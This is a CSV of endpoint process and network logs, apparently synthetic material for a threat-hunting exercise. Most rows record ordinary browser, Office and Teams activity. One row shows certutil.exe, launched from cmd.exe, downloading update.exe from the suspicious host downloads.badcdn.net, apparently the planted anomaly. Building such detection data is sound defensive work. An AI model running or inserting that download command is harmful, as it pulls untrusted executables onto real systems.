timestamp,host,user,process,parent_process,command_line,ip,destination_port,user_agent
2026-04-05 08:00:00,sales-lt-01,ethan,chrome.exe,explorer.exe,chrome.exe --profile-directory=Default --new-window https://portal.company.internal,151.101.1.69,443,chrome
2026-04-05 08:01:00,corp-ws-01,irfan,excel.exe,explorer.exe,excel.exe /background,10.2.10.15,0,none
2026-04-05 08:02:00,corp-ws-04,helen,code.exe,explorer.exe,"code.exe ""C:\Users\helen\Documents\project""",192.168.1.12,445,none
2026-04-05 08:03:00,sales-lt-01,farah,winword.exe,explorer.exe,winword.exe /background,10.0.1.15,0,none
2026-04-05 08:04:00,hr-ws-01,liam,teams.exe,explorer.exe,teams.exe --background-task-mode,185.199.108.153,443,teams-client
2026-04-05 08:05:00,fin-ws-02,george,onenote.exe,explorer.exe,onenote.exe /background,10.2.10.15,0,none
2026-04-05 08:06:00,ops-ws-01,diana,firefox.exe,explorer.exe,firefox.exe --profile-directory=Default --new-window https://portal.company.internal,151.101.1.69,443,firefox
2026-04-05 08:07:00,corp-ws-01,irfan,chrome.exe,explorer.exe,chrome.exe --profile-directory=Default --new-window https://portal.company.internal,23.45.67.89,443,chrome
2026-04-05 08:08:00,corp-ws-01,helen,notepad.exe,explorer.exe,"notepad.exe ""C:\Users\helen\Documents\notes.txt""",10.1.5.12,0,none
2026-04-05 08:09:00,hr-ws-01,bob,chrome.exe,explorer.exe,chrome.exe --profile-directory=Default --new-window https://portal.company.internal,45.33.32.156,443,chrome
2026-04-05 08:10:00,corp-ws-04,george,firefox.exe,explorer.exe,firefox.exe --profile-directory=Default --new-window https://portal.company.internal,52.95.110.1,443,firefox
2026-04-05 08:11:00,sales-lt-01,bob,teams.exe,explorer.exe,teams.exe --background-task-mode,1.1.1.1,443,teams-client
2026-04-05 08:12:00,sales-lt-01,bob,notepad.exe,explorer.exe,"notepad.exe ""C:\Users\bob\Documents\notes.txt""",10.0.0.10,0,none
2026-04-05 08:13:00,fin-ws-02,irfan,chrome.exe,explorer.exe,chrome.exe --profile-directory=Default --new-window https://portal.company.internal,23.45.67.89,443,chrome
2026-04-05 08:14:00,sales-lt-01,liam,code.exe,explorer.exe,"code.exe ""C:\Users\liam\Documents\project""",10.0.0.5,445,none
2026-04-05 08:15:00,sales-lt-01,julia,excel.exe,explorer.exe,excel.exe /background,10.0.1.15,0,none
2026-04-05 08:16:00,hr-ws-01,julia,winword.exe,explorer.exe,winword.exe /background,10.0.2.20,0,none
2026-04-05 08:17:00,corp-ws-03,ethan,firefox.exe,explorer.exe,firefox.exe --profile-directory=Default --new-window https://portal.company.internal,104.18.20.12,443,firefox
2026-04-05 08:18:00,eng-ws-02,irfan,teams.exe,explorer.exe,teams.exe --background-task-mode,23.45.67.89,443,teams-client
2026-04-05 08:19:00,fin-ws-02,george,firefox.exe,explorer.exe,firefox.exe --profile-directory=Default --new-window https://portal.company.internal,185.199.108.153,443,firefox
2026-04-05 08:20:00,ops-ws-02,karen,chrome.exe,explorer.exe,chrome.exe --profile-directory=Default --new-window https://portal.company.internal,1.1.1.1,443,chrome
2026-04-05 08:20:00,fin-ws-02,liam,certutil.exe,cmd.exe,certutil -urlcache -split -f http://downloads.badcdn.net/update.exe file.exe,23.45.67.89,80,curl/7.68
2026-04-05 08:21:00,corp-ws-01,helen,outlook.exe,explorer.exe,"outlook.exe /recycle ""helen@company.com""",52.95.110.1,443,outlook
